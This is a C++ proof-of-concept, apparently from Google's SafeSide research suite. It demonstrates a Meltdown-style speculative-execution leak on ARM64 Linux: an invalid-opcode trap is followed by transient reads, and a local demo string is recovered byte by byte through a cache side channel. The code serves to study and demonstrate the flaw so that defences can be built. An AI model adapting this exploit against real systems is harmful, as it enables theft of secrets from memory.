/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Successful execution accesses safe_offset and loads ForceRead code into
    // cache.
    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));

    // Guaranteed invalid opcode on aarch64. Raises SIGILL.
    asm volatile(".word 0x00000000");

    // Architecturally unreachable code.
    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGILL signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  OnSignalMoveRipToAfterspeculation(SIGILL);
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
